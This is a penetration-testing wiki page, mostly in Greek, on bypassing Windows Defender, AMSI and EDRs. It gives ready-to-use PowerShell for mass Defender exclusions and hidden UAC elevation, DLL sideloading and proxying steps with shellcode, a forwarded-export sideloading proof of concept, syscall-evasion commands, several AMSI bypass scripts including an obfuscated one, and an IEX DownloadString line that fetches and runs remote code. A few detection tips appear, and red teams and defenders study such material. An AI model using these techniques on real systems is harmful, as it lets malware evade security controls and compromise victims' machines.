# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Αυτή η σελίδα γράφτηκε αρχικά από** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Απενεργοποίηση Defender

- [defendnot](https://github.com/es3n1n/defendnot): Εργαλείο για να εμποδίσει το Windows Defender να λειτουργεί.
- [no-defender](https://github.com/es3n1n/no-defender): Εργαλείο που εμποδίζει το Windows Defender να λειτουργεί, προσποιούμενο άλλο AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Δόλωμα UAC σε στυλ installer πριν την παρέμβαση στο Defender

Public loaders masquerading as game cheats συχνά διανέμονται ως μη υπογεγραμμένοι Node.js/Nexe installers που πρώτα **ζητούν από το χρήστη ανύψωση προνομίων** και μόνο στη συνέχεια αδρανοποιούν τον Defender. Η ροή είναι απλή:

1. Ελέγχει για περιβάλλον διαχειριστή με `net session`. Η εντολή εκτελείται επιτυχώς μόνο όταν ο καλών διαθέτει δικαιώματα διαχειριστή, επομένως μια αποτυχία υποδεικνύει ότι ο loader τρέχει ως κανονικός χρήστης.
2. Επανεκκινεί άμεσα τον εαυτό του με το `RunAs` verb για να προκαλέσει την αναμενόμενη προτροπή συγκατάθεσης UAC, διατηρώντας παράλληλα την αρχική γραμμή εντολών.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Τα θύματα ήδη πιστεύουν ότι εγκαθιστούν “cracked” λογισμικό, οπότε η προτροπή συνήθως γίνεται αποδεκτή, δίνοντας στο malware τα δικαιώματα που χρειάζεται για να αλλάξει την πολιτική του Defender.

### Ολικές `MpPreference` εξαιρέσεις για κάθε γράμμα μονάδας δίσκου

Μόλις αποκτήσει δικαιώματα διαχειριστή, οι αλυσίδες τύπου GachiLoader μεγιστοποιούν τα τυφλά σημεία του Defender αντί να απενεργοποιούν την υπηρεσία εντελώς. Ο loader αρχικά σκοτώνει τον GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) και στη συνέχεια ωθεί **εξαιρετικά ευρείες εξαιρέσεις**, ώστε κάθε προφίλ χρήστη, κατάλογος συστήματος και αφαιρούμενη μονάδα δίσκου να μην μπορούν να σαρωθούν:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Key observations:

- Ο βρόχος περνάει από κάθε mounted filesystem (D:\, E:\, USB sticks, κ.λπ.), οπότε **οποιοδήποτε μελλοντικό payload που θα απορριφθεί οπουδήποτε στο δίσκο αγνοείται**.
- Η εξαίρεση της επέκτασης `.sys` είναι μελλοντικά προσανατολισμένη — οι επιτιθέμενοι κρατούν την επιλογή να φορτώσουν unsigned drivers αργότερα χωρίς να ξαναεπεμβαίνουν στον Defender.
- Όλες οι αλλαγές προστίθενται κάτω από `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, επιτρέποντας σε επόμενα στάδια να επιβεβαιώσουν ότι οι εξαιρέσεις διατηρούνται ή να τις επεκτείνουν χωρίς να επανεκκινήσουν το UAC.

Επειδή δεν σταματάει καμία υπηρεσία του Defender, απλοϊκοί έλεγχοι υγείας συνεχίζουν να αναφέρουν “antivirus active” παρόλο που ο έλεγχος σε πραγματικό χρόνο δεν εξετάζει ποτέ αυτές τις διαδρομές.

## **AV Evasion Methodology**

Currently, AVs use different methods for checking if a file is malicious or not, static detection, dynamic analysis, and for the more advanced EDRs, behavioural analysis.

### **Static detection**

Η static detection επιτυγχάνεται σημαίνοντας γνωστές malicious strings ή arrays of bytes σε ένα binary ή script, και επίσης εξάγοντας πληροφορίες από το αρχείο ίδιο (π.χ. file description, company name, digital signatures, icon, checksum, κ.λπ.). Αυτό σημαίνει ότι η χρήση γνωστών δημόσιων εργαλείων μπορεί να σε συλλάβει ευκολότερα, καθώς πιθανότατα έχουν ήδη αναλυθεί και σημακριθεί ως malicious. Υπάρχουν μερικοί τρόποι για να αποφύγεις αυτό το είδος detection:

- **Encryption**

Αν κρυπτογραφήσεις το binary, δεν θα υπάρχει τρόπος για το AV να εντοπίσει το πρόγραμμα σου, αλλά θα χρειαστείς κάποιο loader για να το αποκρυπτογραφήσεις και να τρέξεις το πρόγραμμα στη μνήμη.

- **Obfuscation**

Κάποιες φορές αρκεί να αλλάξεις μερικά strings στο binary ή στο script για να περάσει το AV, αλλά αυτό μπορεί να είναι χρονοβόρο ανάλογα με το τι προσπαθείς να obfuscate.

- **Custom tooling**

Αν αναπτύξεις τα δικά σου εργαλεία, δεν θα υπάρχουν γνωστές bad signatures, αλλά αυτό απαιτεί πολύ χρόνο και προσπάθεια.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Συνιστώ έντονα να δεις αυτό το [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) σχετικά με πρακτική AV Evasion.

### **Dynamic analysis**

Η dynamic analysis είναι όταν το AV τρέχει το binary σου σε ένα sandbox και παρατηρεί για malicious activity (π.χ. προσπαθεί να αποκρυπτογραφήσει και να διαβάσει passwords του browser, να κάνει minidump στο LSASS, κ.λπ.). Αυτό το κομμάτι μπορεί να είναι πιο δύσκολο, αλλά εδώ είναι μερικά πράγματα που μπορείς να κάνεις για να αποφύγεις τα sandboxes.

- **Sleep before execution** Ανάλογα με το πώς είναι υλοποιημένο, μπορεί να είναι ένας πολύ καλός τρόπος παράκαμψης της dynamic analysis των AV. Τα AV έχουν πολύ μικρό χρόνο για να σκανάρουν αρχεία ώστε να μην διακόψουν το workflow του χρήστη, οπότε η χρήση μεγάλων sleeps μπορεί να διαταράξει την ανάλυση των binaries. Το πρόβλημα είναι ότι πολλά sandboxes των AV μπορούν απλά να παρακάμψουν το sleep ανάλογα με την υλοποίηση.
- **Checking machine's resources** Συνήθως τα sandboxes έχουν πολύ λίγους πόρους για να δουλέψουν (π.χ. < 2GB RAM), αλλιώς θα επιβράδυναν το μηχάνημα του χρήστη. Μπορείς επίσης να γίνεις πολύ δημιουργικός εδώ, για παράδειγμα ελέγχοντας τη θερμοκρασία της CPU ή ακόμη και τις ταχύτητες των ανεμιστήρων — δεν θα έχουν όλα υλοποιηθεί στο sandbox.
- **Machine-specific checks** Αν θες να στοχεύσεις έναν χρήστη του οποίου ο workstation είναι joined στο domain "contoso.local", μπορείς να ελέγξεις το domain του υπολογιστή για να δεις αν ταιριάζει με αυτό που όρισες — αν δεν ταιριάζει, το πρόγραμμα σου μπορεί να τερματιστεί.

Turns out ότι το Microsoft Defender's Sandbox computername είναι HAL9TH, οπότε μπορείς να ελέγξεις το computer name στο malware σου πριν τη detonation — αν το όνομα είναι HAL9TH, σημαίνει ότι βρίσκεσαι μέσα στο defender's sandbox, άρα μπορείς να κάνεις το πρόγραμμα σου να βγαίνει.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>πηγή: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Μερικές ακόμα πολύ καλές συμβουλές από [@mgeeky](https://twitter.com/mariuszbit) για αντιμετώπιση των Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Όπως έχουμε πει και νωρίτερα, τα **public tools** τελικά θα **ανιχνευτούν**, οπότε πρέπει να θέσεις στον εαυτό σου το εξής:

Για παράδειγμα, αν θέλεις να dumpάρεις το LSASS, **χρειάζεται πραγματικά να χρησιμοποιήσεις το mimikatz**; Ή μήπως μπορείς να χρησιμοποιήσεις κάποιο άλλο project που είναι λιγότερο γνωστό και επίσης κάνει dump το LSASS.

Η σωστή απάντηση είναι πιθανότατα το δεύτερο. Πάρτε το mimikatz ως παράδειγμα — είναι πιθανόν ένα από τα πιο, αν όχι το πιο, σημαδεμένα κομμάτια malware από AVs και EDRs. Ενώ το project αυτό είναι πολύ καλό, είναι επίσης εφιάλτης να δουλεύεις γύρω από τα AVs, οπότε απλά ψάξε για εναλλακτικές για αυτό που προσπαθείς να πετύχεις.

> [!TIP]
> Όταν τροποποιείς τα payloads σου για evasion, βεβαιώσου να **απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων** στον defender, και παρακαλώ, σοβαρά, **DO NOT UPLOAD TO VIRUSTOTAL** αν ο στόχος σου είναι να πετύχεις evasion μακροπρόθεσμα. Αν θες να ελέγξεις αν το payload σου ανιχνεύεται από ένα συγκεκριμένο AV, εγκατάστησέ το σε ένα VM, προσπάθησε να απενεργοποιήσεις την αυτόματη αποστολή δειγμάτων, και δοκίμασέ το εκεί μέχρι να είσαι ικανοποιημένος με το αποτέλεσμα.

## EXEs vs DLLs

Όποτε είναι δυνατόν, πάντα **προτίμησε να χρησιμοποιείς DLLs για evasion** — κατά την εμπειρία μου, τα αρχεία DLL συνήθως **ανιχνεύονται πολύ λιγότερο** και αναλύονται λιγότερο, οπότε είναι ένα πολύ απλό κόλπο για να αποφύγεις την ανίχνευση σε μερικές περιπτώσεις (αν το payload σου έχει τρόπο να τρέξει ως DLL φυσικά).

Όπως βλέπουμε σε αυτή την εικόνα, ένα DLL Payload από Havoc έχει detection rate 4/26 στο antiscan.me, ενώ το EXE payload έχει detection rate 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me σύγκριση ενός κανονικού Havoc EXE payload vs ενός κανονικού Havoc DLL</p></figcaption></figure>

Τώρα θα δείξουμε μερικά κόλπα που μπορείς να χρησιμοποιήσεις με αρχεία DLL για να είσαι πολύ πιο stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** εκμεταλλεύεται το DLL search order που χρησιμοποιεί ο loader τοποθετώντας τόσο την εφαρμογή θύμα όσο και τα malicious payload(s) δίπλα-δίπλα.

You can check for programs susceptible to DLL Sideloading using [Siofra](https://github.com/Cybereason/siofra) and the following powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Αυτή η εντολή θα εμφανίσει τη λίστα των προγραμμάτων που είναι επιρρεπή σε DLL hijacking μέσα στο "C:\Program Files\\" και τα DLL αρχεία που προσπαθούν να φορτώσουν.

Συστήνω ανεπιφύλακτα να **explore DLL Hijackable/Sideloadable programs yourself**, αυτή η τεχνική είναι αρκετά stealthy όταν γίνει σωστά, αλλά αν χρησιμοποιήσετε δημόσια γνωστά DLL Sideloadable προγράμματα, μπορεί να σας πιάσουν εύκολα.

Απλώς τοποθετώντας ένα κακόβουλο DLL με το όνομα που ένα πρόγραμμα περιμένει να φορτώσει, δεν θα φορτώσει το payload σας, καθώς το πρόγραμμα αναμένει κάποιες συγκεκριμένες συναρτήσεις μέσα σε αυτό το DLL. Για να διορθώσουμε αυτό το ζήτημα, θα χρησιμοποιήσουμε μια άλλη τεχνική που ονομάζεται **DLL Proxying/Forwarding**.

**DLL Proxying** προωθεί τις κλήσεις που κάνει ένα πρόγραμμα από το proxy (και κακόβουλο) DLL προς το αρχικό DLL, διατηρώντας έτσι τη λειτουργικότητα του προγράμματος και επιτρέποντας την εκτέλεση του payload σας.

Θα χρησιμοποιήσω το project [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) από [@flangvik](https://twitter.com/Flangvik/)

Αυτά είναι τα βήματα που ακολούθησα:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Η τελευταία εντολή θα μας δώσει 2 αρχεία: ένα πρότυπο πηγαίου κώδικα DLL και το αρχικό μετονομασμένο DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Both our shellcode (encoded with [SGN](https://github.com/EgeBalci/sgn)) and the proxy DLL have a 0/26 Detection rate in [antiscan.me](https://antiscan.me)! I would call that a success.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Σας **συνιστώ ανεπιφύλακτα** να παρακολουθήσετε [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) για το DLL Sideloading και επίσης [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) για να μάθετε περισσότερα σχετικά με όσα συζητήσαμε σε βάθος.

### Abusing Forwarded Exports (ForwardSideLoading)

Τα Windows PE modules μπορούν να εξάγουν συναρτήσεις που στην πραγματικότητα είναι "forwarders": αντί να δείχνουν σε κώδικα, η εγγραφή εξαγωγής περιέχει ένα ASCII string της μορφής `TargetDll.TargetFunc`. Όταν ένας caller επιλύει την εξαγωγή, ο Windows loader θα:

- Θα φορτώσει `TargetDll` αν δεν έχει ήδη φορτωθεί
- Θα επιλύσει `TargetFunc` από αυτό

Key behaviors to understand:
- Αν `TargetDll` είναι KnownDLL, προμηθεύεται από το προστατευμένο KnownDLLs namespace (π.χ., ntdll, kernelbase, ole32).
- Αν `TargetDll` δεν είναι KnownDLL, χρησιμοποιείται η κανονική σειρά αναζήτησης DLL, που περιλαμβάνει τον κατάλογο του module που κάνει την επίλυση του forward.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` δεν είναι KnownDLL, οπότε επιλύεται μέσω της κανονικής σειράς αναζήτησης.

PoC (copy-paste):
1) Αντιγράψτε το υπογεγραμμένο DLL συστήματος σε έναν εγγράψιμο φάκελο
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Τοποθετήστε ένα κακόβουλο `NCRYPTPROV.dll` στον ίδιο φάκελο. Ένα ελάχιστο DllMain αρκεί για την εκτέλεση κώδικα· δεν χρειάζεται να υλοποιήσετε την forwarded function για να ενεργοποιηθεί το DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Ενεργοποιήστε την προώθηση με ένα υπογεγραμμένο LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Παρατηρούμενη συμπεριφορά:
- Το rundll32 (signed) φορτώνει το side-by-side `keyiso.dll` (signed)
- Ενώ επιλύει το `KeyIsoSetAuditingInterface`, ο loader ακολουθεί το forward προς το `NCRYPTPROV.SetAuditingInterface`
- Στη συνέχεια ο loader φορτώνει το `NCRYPTPROV.dll` από το `C:\test` και εκτελεί το `DllMain` του
- Αν το `SetAuditingInterface` δεν είναι υλοποιημένο, θα λάβετε σφάλμα "missing API" μόνο αφού το `DllMain` έχει ήδη τρέξει

Συμβουλές ανίχνευσης:
- Επικεντρωθείτε σε forwarded exports όπου το target module δεν είναι KnownDLL. Οι KnownDLLs παρατίθενται κάτω από `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Μπορείτε να απαριθμήσετε forwarded exports με εργαλεία όπως:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Δείτε τον κατάλογο forwarder των Windows 11 για να αναζητήσετε υποψήφιους: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Παρακολουθήστε LOLBins (π.χ., rundll32.exe) που φορτώνουν signed DLLs από μη-system διαδρομές, και στη συνέχεια φορτώνουν non-KnownDLLs με το ίδιο base name από αυτή τη διαδρομή
- Ειδοποιήστε για αλυσίδες process/module όπως: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` under user-writable paths
- Εφαρμόστε πολιτικές code integrity (WDAC/AppLocker) και απορρίψτε write+execute σε application directories

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Μπορείτε να χρησιμοποιήσετε το Freeze για να φορτώσετε και να εκτελέσετε το shellcode σας με διακριτικό τρόπο.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion είναι απλώς ένα παιχνίδι γάτας και ποντικιού — ό,τι δουλεύει σήμερα μπορεί να εντοπιστεί αύριο, οπότε μην βασίζεστε ποτέ σε ένα μόνο εργαλείο· αν είναι δυνατό, δοκιμάστε να συνδυάσετε πολλαπλές τεχνικές evasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs συχνά τοποθετούν **user-mode inline hooks** σε `ntdll.dll` syscall stubs. Για να παρακάμψετε αυτά τα hooks, μπορείτε να δημιουργήσετε **direct** ή **indirect** syscall stubs που φορτώνουν τον σωστό **SSN** (System Service Number) και μεταβαίνουν σε kernel mode χωρίς να εκτελέσουν το hooked export entrypoint.

**Invocation options:**
- **Direct (embedded)**: το generated stub περιέχει μια εντολή `syscall`/`sysenter`/`SVC #0` (no `ntdll` export hit).
- **Indirect**: κάνετε jump σε υπάρχον `syscall` gadget μέσα στο `ntdll` ώστε η μετάβαση στον kernel να φαίνεται ότι προέρχεται από `ntdll` (χρήσιμο για heuristic evasion); **randomized indirect** επιλέγει ένα gadget από μια pool ανά κλήση.
- **Egg-hunt**: αποφύγετε την ενσωμάτωση της στατικής ακολουθίας opcode `0F 05` στο δίσκο — επιλύστε την ακολουθία syscall κατά το runtime.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: συμπεραίνετε τα SSN ταξινομώντας τα syscall stubs κατά virtual address αντί να διαβάζετε τα bytes των stub.
- **SyscallsFromDisk**: mapάρετε ένα καθαρό `\KnownDlls\ntdll.dll`, διαβάστε τα SSN από το `.text`, και μετά unmap (παρακάμπτει όλα τα in-memory hooks).
- **RecycledGate**: συνδυάστε VA-sorted SSN inference με opcode validation όταν ένα stub είναι clean· κάντε fallback σε VA inference αν είναι hooked.
- **HW Breakpoint**: θέστε DR0 στην εντολή `syscall` και χρησιμοποιήστε VEH για να καταγράψετε το SSN από `EAX` κατά το runtime, χωρίς να κάνετε parsing των hooked bytes.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

Το AMSI δημιουργήθηκε για να αποτρέψει "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Αρχικά, τα AVs ήταν ικανά να σκανάρουν μόνο **files on disk**, οπότε αν με κάποιο τρόπο μπορούσες να εκτελέσεις payloads **directly in-memory**, το AV δεν μπορούσε να κάνει τίποτα για να το αποτρέψει, καθώς δεν είχε επαρκή ορατότητα.

Η λειτουργία AMSI είναι ενσωματωμένη σε αυτές τις συνιστώσες των Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Επιτρέπει στις λύσεις antivirus να εξετάζουν τη συμπεριφορά των scripts, αποκαλύπτοντας το περιεχόμενο των scripts σε μορφή που είναι μη κρυπτογραφημένη και μη απο-οβφυσκαρισμένη.

Η εκτέλεση `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` θα παράγει την ακόλουθη ειδοποίηση στο Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Παρατήρησε πώς προθέτει `amsi:` και στη συνέχεια τη διαδρομή προς το εκτελέσιμο από το οποίο εκτελέστηκε το script, στην προκειμένη περίπτωση, powershell.exe

Δεν αποθηκεύσαμε κάποιο αρχείο στο δίσκο, αλλά παρόλα αυτά εντοπιστήκαμε in-memory λόγω του AMSI.

Επιπλέον, ξεκινώντας από **.NET 4.8**, ο C# κώδικας περνά επίσης από το AMSI. Αυτό επηρεάζει ακόμη και το `Assembly.Load(byte[])` για φόρτωση/εκτέλεση in-memory. Γι' αυτό συνιστάται η χρήση χαμηλότερων εκδόσεων του .NET (π.χ. 4.7.2 ή παλαιότερες) για in-memory execution αν θέλεις να αποφύγεις το AMSI.

Υπάρχουν μερικοί τρόποι για να παρακαμφθεί το AMSI:

- **Obfuscation**

Εφόσον το AMSI λειτουργεί κυρίως με static detections, η τροποποίηση των scripts που προσπαθείς να φορτώσεις μπορεί να είναι καλός τρόπος για να αποφύγεις τον εντοπισμό.

Ωστόσο, το AMSI έχει την ικανότητα να απο-οβφυσκάρει scripts ακόμα και αν έχουν πολλαπλά επίπεδα, οπότε η obfuscation μπορεί να είναι κακή επιλογή ανάλογα με τον τρόπο που γίνεται. Αυτό το καθιστά όχι και τόσο απλό να το παρακάμψεις. Παρόλα αυτά, μερικές φορές όλα όσα χρειάζεται να κάνεις είναι να αλλάξεις μερικά ονόματα μεταβλητών και θα είσαι εντάξει, οπότε εξαρτάται από το πόσο έχει σημαδευτεί κάτι.

- **AMSI Bypass**

Εφόσον το AMSI υλοποιείται με το φόρτωμα ενός DLL στη διεργασία του powershell (επίσης cscript.exe, wscript.exe, κ.λπ.), είναι εφικτό να το τροποποιήσεις εύκολα ακόμη και όταν τρέχεις ως μη προνομιούχος χρήστης. Λόγω αυτού του σφάλματος στην υλοποίηση του AMSI, ερευνητές έχουν βρει πολλούς τρόπους να αποφύγουν το AMSI scanning.

**Forcing an Error**

Η εξαναγκασμένη αποτυχία της αρχικοποίησης του AMSI (amsiInitFailed) θα έχει ως αποτέλεσμα να μην ξεκινήσει κανένα scan για την τρέχουσα διεργασία. Αρχικά αυτό δημοσιοποιήθηκε από [Matt Graeber](https://twitter.com/mattifestation) και η Microsoft έχει αναπτύξει ένα signature για να αποτρέψει ευρύτερη χρήση.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Το μόνο που χρειάστηκε ήταν μία γραμμή κώδικα powershell για να καταστήσει την AMSI μη λειτουργική για τη τρέχουσα διαδικασία powershell. Αυτή η γραμμή έχει φυσικά επισημανθεί από την ίδια την AMSI, οπότε απαιτείται κάποια τροποποίηση για να χρησιμοποιηθεί αυτή η τεχνική.

Ακολουθεί ένας τροποποιημένος AMSI bypass που πήρα από αυτό το [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Λάβετε υπόψη ότι αυτό πιθανώς θα επισημανθεί μόλις δημοσιευτεί αυτό το άρθρο, επομένως δεν πρέπει να δημοσιεύσετε οποιονδήποτε κώδικα αν σκοπεύετε να παραμείνετε μη ανιχνεύσιμοι.

**Memory Patching**

This technique was initially discovered by [@RastaMouse](https://twitter.com/_RastaMouse/) and it involves finding address for the "AmsiScanBuffer" function in amsi.dll (responsible for scanning the user-supplied input) and overwriting it with instructions to return the code for E_INVALIDARG, this way, the result of the actual scan will return 0, which is interpreted as a clean result.

> [!TIP]
> Παρακαλώ διαβάστε [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) για μια πιο λεπτομερή εξήγηση.

There are also many other techniques used to bypass AMSI with powershell, check out [**αυτή η σελίδα**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**αυτό το repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI is initialised only after `amsi.dll` is loaded into the current process. A robust, language‑agnostic bypass is to place a user‑mode hook on `ntdll!LdrLoadDll` that returns an error when the requested module is `amsi.dll`. As a result, AMSI never loads and no scans occur for that process.

Περίγραμμα υλοποίησης (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Λειτουργεί σε PowerShell, WScript/CScript και custom loaders (οτιδήποτε που διαφορετικά θα φόρτωνε AMSI).
- Συνδυάστε με την παροχή scripts μέσω stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) για να αποφύγετε μεγάλες ενδείξεις στη γραμμή εντολών.
- Έχει παρατηρηθεί χρήση από loaders που εκτελούνται μέσω LOLBins (π.χ., `regsvr32` που καλεί `DllRegisterServer`).

The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.

**Αφαίρεση της ανιχνευμένης signature**

Μπορείτε να χρησιμοποιήσετε ένα εργαλείο όπως **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** και **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** για να αφαιρέσετε την ανιχνευμένη AMSI signature από τη μνήμη της τρέχουσας διεργασίας. Το εργαλείο αυτό λειτουργεί σαρώνοντας τη μνήμη της τρέχουσας διεργασίας για την AMSI signature και στη συνέχεια την αντικαθιστά με NOP instructions, αφαιρώντας την ουσιαστικά από τη μνήμη.

**AV/EDR προϊόντα που χρησιμοποιούν AMSI**

Μπορείτε να βρείτε μια λίστα με AV/EDR προϊόντα που χρησιμοποιούν AMSI στο **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Χρησιμοποιήστε PowerShell έκδοση 2**
Αν χρησιμοποιήσετε PowerShell έκδοση 2, το AMSI δεν θα φορτωθεί, οπότε μπορείτε να τρέξετε τα scripts σας χωρίς να σαρωθούν από AMSI. Μπορείτε να το κάνετε ως εξής:
```bash
powershell.exe -version 2
```
## PS Logging

